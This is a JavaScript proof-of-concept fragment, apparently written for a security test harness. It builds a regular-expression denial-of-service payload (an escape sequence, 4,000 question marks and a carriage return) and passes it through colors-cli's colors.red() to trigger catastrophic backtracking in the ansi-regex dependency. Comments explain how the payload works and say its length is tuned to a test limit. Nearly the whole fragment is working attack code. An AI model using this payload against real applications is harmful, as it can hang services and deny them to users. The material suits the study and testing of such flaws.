    const colors = require('colors-cli');

    console.log('Initiating ansi-regex ReDoS exploitation via colors-cli...');

    // Constructing a payload specifically designed to trigger catastrophic backtracking in `ansi-regex`.
    // 1. \u001b[ : Starts a CSI (Control Sequence Introducer). This forces the parser to look for 
    //    parameters and intermediates defined by the regex.
    // 2. '?'.repeat(4000) : In the vulnerable ansi-regex, '?' can be ambiguously matched as part of 
    //    parameter lists or intermediate character states. Providing a long sequence without a valid 
    //    terminator exploits this ambiguity. The regex engine enters an exponential backtracking loop 
    //    trying to find a match that doesn't exist.
    // 3. '\r' : Acts as the invalid terminator/mismatch signal at the end of the string, triggering 
    //    the full backtracking over the entire payload length.
    // This length is tuned specifically to exceed the testing environment's backtracking limit of 30000.
    const payload = '\u001b[' + '?'.repeat(4000) + '\r';

    console.log(`Injecting ${payload.length} length malicious sequence...`);

    // Attempting to color the input triggers the sanitize/regex pipeline.
    // The coloring operation will hang or trigger the backtracking limit due to the payload.
    console.log('Processing through colors.red()...');
    const result = colors.red(payload);

    console.log('Analysis complete: Engine behavior demonstrated.');
    return result;
}

await exploit();
